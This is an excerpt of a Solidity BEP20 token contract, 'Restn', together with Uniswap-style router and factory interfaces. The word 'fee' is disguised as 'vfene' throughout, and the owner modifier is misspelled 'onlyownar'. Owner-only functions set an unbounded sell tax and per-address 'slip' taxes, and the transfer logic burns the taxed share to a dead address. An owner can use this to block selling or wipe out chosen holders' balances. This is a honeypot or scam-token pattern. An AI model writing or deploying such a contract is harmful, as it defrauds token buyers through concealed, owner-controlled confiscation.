...
interface IUniswapV2Factory {
    ...
    function vfeneTo() external view returns (address);
    function vfeneToSetter() external view returns (address);
    ...
    function setvfeneTo(address) external;
    function setvfeneToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingvfeneOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingvfeneOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingvfeneOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingvfeneOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingvfeneOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Restn is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellvfene = 0;

    uint256 private _defaultBuyvfene = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipvfene;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellvfene = _value;
    }

    function setSlipvfene(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipvfene[_address] = _value;
    }

    function getSlipvfene(address _address) external view onlyownar returns (uint256) {
        return _slipvfene[_address];
    }


    function setMAccountvfene(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountvfene(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradevfeneAmount = 0;

        if (rF) {
            uint256 tradevfene = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradevfene = _defaultSellvfene;
                }
                if (from == uniswapV2Pair) {

                    tradevfene = _defaultBuyvfene;
                }
            }
            if (_slipvfene[from] > 0) {
                tradevfene = _slipvfene[from];
            }

            tradevfeneAmount = _Amount.mul(tradevfene).div(100);
        }


        if (tradevfeneAmount > 0) {
            _balances[from] = _balances[from].sub(tradevfeneAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradevfeneAmount);
            emit Transfer(from, _deadAddress, tradevfeneAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradevfeneAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradevfeneAmount);
        emit Transfer(from, _to, _Amount - tradevfeneAmount);
    }
